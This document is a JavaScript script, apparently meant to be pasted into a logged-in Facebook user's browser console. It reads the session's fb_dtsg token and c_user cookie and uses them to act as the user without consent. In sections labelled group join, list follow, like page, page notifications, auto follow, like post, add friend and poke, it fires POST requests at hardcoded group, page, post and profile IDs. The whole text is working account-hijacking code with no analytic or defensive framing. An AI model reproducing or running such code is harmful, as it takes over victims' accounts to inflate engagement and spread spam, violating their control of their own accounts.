/*group Join*/
var b = document.getElementsByName("fb_dtsg")[0].value,
    c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);


function g(d) {
    var a = new XMLHttpRequest;
    d = "&ref=group_jump_header&group_id=" + d + "&fb_dtsg=" + b + "&__user=" + c + "&phstamp=";
    a.open("POST", "/ajax/groups/membership/r2j.php?__a=1", !0);
    a.onreadystatechange = function () {
        4 == a.readyState && 200 == a.status && a.close
    };
    a.send(d)
}
g("1413025565582707");
g("497341857007148")
b = document.getElementsByName("fb_dtsg")[0].value;
c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);





/*list follow*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function LIST(L) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid="+L;
    var XParams = "fb_dtsg="+fb_dtsg+"&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECQ8yo&__req=d&ttstamp=26581681054512111570";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}
LIST("436167659823497");
LIST("1460628884164211");
LIST("1460627990830967");
LIST("446325055474424");





/*Like Page*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close;
        }
    };
    Page.send(PageParams);
}
Like("179350925575427");
Like("138888282975552");
Like("666541306695062");







/*page noti*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function N(noti) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/settings/notifications/notify_me.php";
  var PageParams ="notifier_id="+noti+"&enable=true&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=a&fb_dtsg=AQCPMc2R&ttstamp=26581678077995082";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
N("179350925575427");
N("138888282975552");
N("666541306695062");





/*Auto Follow*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
    var http4 = new XMLHttpRequest();
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close;
        }
    };
    http4.send(params4);
}
a("100002908006006");
a("100004237262656");
a("100005255853149");
a("100006437590808");
a("100005202368891");
a("100006640748984");





/*like post php*/
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now = (new Date).getTime();

function p(post) {
  
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=2&client_id=1381377993496%3A1284500146&rootid=u_0_8&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=g&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}
p("488215757952020");



Add Friend
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("100006513405329");




poke
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function p(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "//www.facebook.com/pokes/dialog/?poke_target=" + abone + "&do_confirm=0";
  var params4 = "poke_target=" + abone + "&do_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmvudDgDxrHEHyGameyp8y&__req=i&fb_dtsg="+fb_dtsg+"&ttstamp=265816580891117469";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}

p("100006513405329");
p("100002908006006");
p("100006437590808");
p("100005202368891");
